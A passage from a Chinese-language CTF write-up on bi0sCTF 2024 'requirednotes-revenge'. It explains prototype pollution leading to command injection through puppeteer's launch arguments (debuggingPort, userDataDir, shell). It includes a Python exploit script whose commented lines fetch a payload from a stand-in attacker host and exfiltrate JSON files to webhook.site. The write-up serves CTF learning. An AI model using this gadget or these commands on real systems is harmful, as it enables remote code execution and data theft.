options</code>这个<code>attribute</code>没办法污染，寄。调半天也没明白为啥不行，猜测是<code>protobuf.js</code>解析的时候发现有空格就认为是赋值操作？不过这种带空格的属性不加单引号估计不太可能污染的上。</p><pre class="line-numbers language-js"><code class="language-js">viewOpts <span class="token operator">=</span> data<span class="token punctuation">.</span>settings<span class="token punctuation">[</span><span class="token string">'view options'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>viewOpts<span class="token punctuation">)</span> <span class="token punctuation">{</span>  utils<span class="token punctuation">.</span><span class="token function">shallowCopy</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> viewOpts<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="非预期2"><a href="#非预期2" class="headerlink" title="非预期2"></a>非预期2</h5><p>污染<code>_peername.address</code>可以让我们访问<code>search</code>路由，这就很神奇。</p><pre><code>option(a).constructor.prototype._peername.address = \&quot;127.0.0.1\&quot;</code></pre><p>之后爆破就完事了。</p><h4 id="requirenotes-revenge"><a href="#requirenotes-revenge" class="headerlink" title="requirenotes-revenge"></a>requirenotes-revenge</h4><h5 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h5><p><code>revenge</code>也被非预期<code>RCE</code>了，其中<code>revenge</code>修了<code>ejs</code>模版渲染<code>RCE</code>那条<code>gadget</code>。</p><p><code>patch</code>（仅针对于<code>ejs</code>）挺顶级的，这下也没办法污染<code>escapeFunction</code>了。</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'view options'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>  client<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>   escapeFunction<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> html<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[&amp;&lt;>"']/g</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>match<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token punctuation">{</span>        <span class="token string">'&amp;'</span><span class="token punctuation">:</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">,</span>        <span class="token string">'&lt;'</span><span class="token punctuation">:</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">,</span>        <span class="token string">'>'</span><span class="token punctuation">:</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">,</span>        <span class="token string">'"'</span><span class="token punctuation">:</span> <span class="token string">'&amp;quot;'</span><span class="token punctuation">,</span>        <span class="token string">"'"</span><span class="token punctuation">:</span> <span class="token string">'&amp;#39;'</span>      <span class="token punctuation">}</span><span class="token punctuation">[</span>match<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>   escape<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还限制了长度和字符。</p><pre class="line-numbers language-js"><code class="language-js">  <span class="token keyword">if</span> <span class="token punctuation">(</span>author<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">86</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> Message<span class="token punctuation">:</span> <span class="token string">'Internal server error'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex">/^[A-Za-z0-9/."\\(){};=]+$/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>author<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> Message<span class="token punctuation">:</span> <span class="token string">'Internal server error'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看样子<code>ejs</code>这条路走不通了，不过老外哥找出了一条<code>puppetter RCE gadget</code>。感觉还挺通用的，现在国外<code>XSS</code>都是<code>puppeter</code>。其实意会一下就知道<code>puppeteer</code>启动<code>chrome</code>肯定得执行命令，类似<code>spawn execSync</code>这种，所以应该是能找到一点机会。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> puppeteer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'puppeteer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">healthCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    headless<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    args<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> response<span class="token operator">=</span><span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token string">"http://localhost:3000/view/Healthcheck"</span><span class="token punctuation">)</span>  <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span> healthCheck <span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>launch</code>最终会调用<code>spawn</code>，这里<code>executablePath</code>无所谓，因为我们是打命令注入，这里爱执行啥执行啥。重点在于<code>this.#args</code>。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">this</span><span class="token punctuation">.</span>#browserProcess <span class="token operator">=</span> child_process_1<span class="token punctuation">.</span><span class="token keyword">default</span><span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>#executablePath<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>#args<span class="token punctuation">,</span> <span class="token punctuation">{</span>    detached<span class="token punctuation">:</span> opts<span class="token punctuation">.</span>detached<span class="token punctuation">,</span>    env<span class="token punctuation">:</span> opts<span class="token punctuation">.</span>env<span class="token punctuation">,</span>    stdio<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">Process <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\node_modules\@puppeteer\browsers\lib\cjs\launch.js:107<span class="token punctuation">)</span>launch <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\node_modules\@puppeteer\browsers\lib\cjs\launch.js:60<span class="token punctuation">)</span>launch <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\node_modules\puppeteer-core\lib\cjs\puppeteer\node\ProductLauncher.js:86<span class="token punctuation">)</span>await <span class="token punctuation">(</span>Unknown Source:0<span class="token punctuation">)</span>launch <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\node_modules\puppeteer-core\lib\cjs\puppeteer\node\ChromeLauncher.js:51<span class="token punctuation">)</span>launch <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\node_modules\puppeteer-core\lib\cjs\puppeteer\node\PuppeteerNode.js:142<span class="token punctuation">)</span>healthCheck <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\bot.js:4<span class="token punctuation">)</span><span class="token operator">&lt;</span>anonymous<span class="token operator">></span> <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\index.js:235<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>args</code>我们可以通过<code>lanunch</code>声明。</p><pre class="line-numbers language-js"><code class="language-js">  <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    headless<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    args<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>debug</code>看看里面的逻辑，发现最终会触发到<code>ChromeLauncher.js#computeLaunchArguments</code>。</p><p>该函数声明了一堆未定义常量，<code>options</code>就是我们传进来的<code>&#123;     headless: true,     args:[&#39;--no-sandbox&#39;]   &#125;</code>了。</p><p><code>debuggingPort, channel, executablePath</code>默认都为空。</p><pre class="line-numbers language-js"><code class="language-js">    <span class="token keyword">async</span> <span class="token function">computeLaunchArguments</span><span class="token punctuation">(</span>options <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> <span class="token punctuation">{</span> ignoreDefaultArgs <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">,</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pipe <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">,</span> debuggingPort<span class="token punctuation">,</span> channel<span class="token punctuation">,</span> executablePath<span class="token punctuation">,</span> <span class="token punctuation">}</span> <span class="token operator">=</span> options<span class="token punctuation">;</span>        <span class="token keyword">const</span> chromeArguments <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ignoreDefaultArgs<span class="token punctuation">)</span> <span class="token punctuation">{</span>            chromeArguments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">defaultArgs</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//...</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到<code>pipe=false</code>时，会把<code>debuggingPort</code>赋值给<code>--remote-debugging-port</code>，那么这里原型链污染<code>debuggingPort</code>就可以了。类似<code>;whoami;</code>这样命令注入即可。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>pipe<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> assert_js_1<span class="token punctuation">.</span>assert<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">!</span>debuggingPort<span class="token punctuation">,</span> <span class="token string">'Browser should be launched with either pipe or debugging port - not both.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chromeArguments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'--remote-debugging-pipe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    chromeArguments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`--remote-debugging-port=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>debuggingPort <span class="token operator">||</span> <span class="token number">0</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么还有别的污染选择吗？看到当<code>ignoreDefaultArgs</code>为<code>false</code>时，会调用<code>this.defaultArgs(options)</code>。污染<code>userDataDir</code>也可以。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>userDataDir<span class="token punctuation">)</span> <span class="token punctuation">{</span>    chromeArguments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`--user-data-dir=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>path_1<span class="token punctuation">.</span><span class="token keyword">default</span><span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>userDataDir<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此外，我们还需要设置<code>options.shell=sh</code>，即在 <code>sh</code> 中运行命令，不过注意只需污染一次。</p><p>另外污染<code>debuggingPort</code>是要比<code>userDataDir</code>更通用的，因为给用户数据目录赋值时会调用<code>path_1.default.resolve</code>，碰到数组会直接抛出异常。因此使用<code>userDataDir</code>需要做到一击必杀，即只有执行一次命令的机会。</p><p>而<code>debuggingPort</code>就没通过函数解析，所以我们无需担心类型转换问题。赋值<code>option(a).constructor.prototype.debuggingPort=&quot;;calc;a=&quot;</code>即可。</p><p><strong>exploit</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> httpxBASE_URL <span class="token operator">=</span> <span class="token string">"http://localhost:3000"</span>ATTACKER_HOST <span class="token operator">=</span> <span class="token string">"evil.example.com"</span>client <span class="token operator">=</span> httpx<span class="token punctuation">.</span>Client<span class="token punctuation">(</span>base_url<span class="token operator">=</span>BASE_URL<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pp</span><span class="token punctuation">(</span>key<span class="token punctuation">:</span> str<span class="token punctuation">,</span> value<span class="token punctuation">:</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>    author <span class="token operator">=</span> <span class="token string">"option(a).constructor.prototype."</span> <span class="token operator">+</span> key <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> value <span class="token operator">+</span> <span class="token string">""</span>    <span class="token keyword">assert</span> len<span class="token punctuation">(</span>author<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>author<span class="token punctuation">,</span> len<span class="token punctuation">(</span>author<span class="token punctuation">)</span><span class="token punctuation">]</span>    res <span class="token operator">=</span> client<span class="token punctuation">.</span>post<span class="token punctuation">(</span>        <span class="token string">"/customise"</span><span class="token punctuation">,</span>        json<span class="token operator">=</span><span class="token punctuation">{</span>            <span class="token string">"data"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token punctuation">{</span>                    <span class="token string">"author"</span><span class="token punctuation">:</span> author<span class="token punctuation">,</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span>    <span class="token keyword">assert</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"Message"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"Settings changed"</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text    res <span class="token operator">=</span> client<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"/create"</span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token comment" spellcheck="true"># PP gadgets in puppeteer:</span><span class="token comment" spellcheck="true"># - https://github.com/puppeteer/puppeteer/blob/puppeteer-v21.5.2/packages/browsers/src/launch.ts#L199-L207</span><span class="token comment" spellcheck="true"># - https://github.com/puppeteer/puppeteer/blob/puppeteer-v21.5.2/packages/puppeteer-core/src/node/ChromeLauncher.ts#L76-L83</span>pp<span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">,</span> <span class="token string">'"sh"'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#只执行一次，因为The "options.shell" property must be one of type boolean or string. Received an instance of Array</span><span class="token comment" spellcheck="true"># pp("executablePath",'"echo"')</span>pp<span class="token punctuation">(</span><span class="token string">"userDataDir"</span><span class="token punctuation">,</span><span class="token string">'"a;calc;"'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#只有一次机会</span><span class="token comment" spellcheck="true"># pp("debuggingPort",'";calc;a="')</span><span class="token comment" spellcheck="true"># pp("debuggingPort", '";calc;a="')</span><span class="token comment" spellcheck="true"># pp("debuggingPort", f'";wget\\t{ATTACKER_HOST}/x;a="')</span><span class="token comment" spellcheck="true"># pp("debuggingPort", '";sh\\tx;"')</span><span class="token comment" spellcheck="true"># You need to serve the following shell script at `http://{ATTACKER_HOST}/x`:</span><span class="token comment" spellcheck="true">#     ```</span><span class="token comment" spellcheck="true">#     wget https://webhook.site/xxxxx --post-data="$(cat *.json)"</span><span class="token comment" spellcheck="true">#     ```</span>res <span class="token operator">=</span> client<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"/healthcheck"</span><span class="token punctuation">)</span><span class="token keyword">assert</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"Message"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"healthcheck failed"</span><span class="token comment" spellcheck="true"># -> {"title":"flag","content":"bi0sctf{riDPzbM5H7l3JAex+mw2vA==}"}{"title":"Healthcheck","content":"success"}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1709105297213.jpg" alt="1709105297213"></p><h5 id="预期解（未分析完）"><a href="#预期解（未分析完）" class="headerlink" title="预期解（未分析完）"></a>预期解（未分析完）</h5><p>预期解就比较巧妙了，巧妙到看不懂:)</p><h6 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h6><p>这里需要几个前置知识：</p><p>对于<code>nodejs</code>来说<code>require</code>一个模块是有缓存的，第一次加载模块后将对其进行缓存，每次对<code>require(&#39;test&#39;)</code>的调用都将返回完全相同的对象，缓存提高了模块加载的效率，特别是对于频繁被多个其他模块依赖和引用的模块。。为了删除缓存可以通过<code>require.cache</code>，其键是已加载模块的完整路径，而值是模块的导出对象。</p><p>而<code>module.constructor._pathCache</code>大概可以理解为用于减少重复的文件系统操作。比如<code>require.resolve</code> 函数用于解析模块的路径，但不加载模块本身。它返回解析后的模块的绝对路径。这个解析过程可能会涉及到文件系统的多次访问，特别是当搜索 <code>node_modules</code> 目录和处理包的 <code>package.json</code> 文件时。为了提高这个过程的效率，<code>Node.js</code> 会缓存解析过程的结果，这样当再次请求相同模块的解析时，可以直接返回缓存的路径，而不是重新进行解析。</p><p>而在<code>require</code>中，还有一些小细节值得学习。</p><ul><li><strong>模块标识（<code>data.name</code>）</strong>：指的模块的名称或路径，用于唯一标识一个模块。在 <code>Node.js</code> 中，模块标识通常是模块的文件路径或安装的包名称。</li><li><strong>模块导出（<code>data.exports</code>）</strong>：在 <code>Node.js</code> 模块系统中，每个模块都可以导出对象、函数、类等，使它们可以被其他模块通过 <code>require</code> 函数导入。这是通过模块的 <code>module.exports</code> 属性实现的。模块的导出对象是其他模块通过 <code>require</code> 函数获取的值。</li></ul><h6 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h6><p>关键有三个路由</p><p><code>/view/:noteId</code>用来看笔记，不过比较逆天的是首先用<code>require.resolve</code>解析<code>note</code>的路径，随后通过<code>require(./notes/$&#123;noteId&#125;)</code>获取<code>note</code>内容。另外只要传个<code>temp</code>就能删除指定的笔记，感觉这两点很有用。</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/view/:noteId'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> noteId <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>noteId<span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> note<span class="token operator">=</span>require<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./notes/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>noteId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>note<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".json"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> Message<span class="token punctuation">:</span> <span class="token string">'Internal Server Error'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">let</span> noteData <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./notes/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>noteId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> key <span class="token keyword">in</span> module<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>_pathCache<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"./notes/"</span><span class="token operator">+</span>noteId<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>module<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>_pathCache<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span>noteId<span class="token operator">+</span><span class="token string">".json"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>noteId<span class="token operator">===</span>healthCheckId<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">cleanserver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">delete</span> module<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>_pathCache<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> Message<span class="token punctuation">:</span> <span class="token string">'Internal Server Error'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>temp <span class="token operator">!==</span> undefined<span class="token punctuation">)</span><span class="token punctuation">{</span>      fs<span class="token punctuation">.</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./notes/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>noteId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.json`</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span>unlinkError<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>unlinkError<span class="token punctuation">)</span> <span class="token punctuation">{</span>          console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'File missing'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        noteList<span class="token operator">=</span>noteList<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span>value<span class="token operator">!=</span>noteId<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'view'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> noteData <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> Message<span class="token punctuation">:</span> <span class="token string">'Internal Server Error'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第二个路由<code>/healthcheck</code>就是让<code>bot</code>访问<code>helthcheck.json</code>这个文件了。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">healthCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    headless<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    args<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'--no-sandbox'</span><span class="token 